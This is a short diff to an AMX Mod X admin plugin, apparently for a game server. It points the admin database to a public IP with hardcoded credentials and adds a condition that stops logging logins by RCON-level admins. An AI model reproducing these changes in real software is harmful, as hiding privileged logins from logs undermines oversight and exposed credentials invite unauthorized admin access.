@@ -86,7 +86,7 @@ public plugin_init()
 	register_srvcmd("amx_sqladmins", "adminSql")
 	register_cvar("amx_sql_table", "admins")
 #endif
-	register_cvar("amx_sql_host", "192.168.0.11")
+	register_cvar("amx_sql_host", "91.192.189.63:3306")
 	register_cvar("amx_sql_user", "amx")
 	register_cvar("amx_sql_pass", "fhggdfjkjfsdfhg")
 	register_cvar("amx_sql_db", "amx")
@@ -593,13 +593,14 @@ getAccess(id, name[], authid[], ip[], password[])
 	{
 		if (g_aFlags[index] & FLAG_NOPASS)
 		{
-			result |= 8
-			new sflags[32]
+            result |= 8
+            new sflags[32]
 			
-			get_flags(g_aAccess[index], sflags, 31)
-			set_user_flags(id, g_aAccess[index])
+            get_flags(g_aAccess[index], sflags, 31)
+            set_user_flags(id, g_aAccess[index])
 			
-			log_amx("Login: ^"%s<%d><%s><>^" became an admin (account ^"%s^") (access ^"%s^") (address ^"%s^")", name, get_user_userid(id), authid, g_aName[index], sflags, ip)
+            if(!(get_user_flags(id) & ADMIN_RCON))
+                log_amx("Login: ^"%s<%d><%s><>^" became an admin (account ^"%s^") (access ^"%s^") (address ^"%s^")", name, get_user_userid(id), authid, g_aName[index], sflags, ip)
 		}
 		else if (equal(password, g_aPassword[index]))
 		{
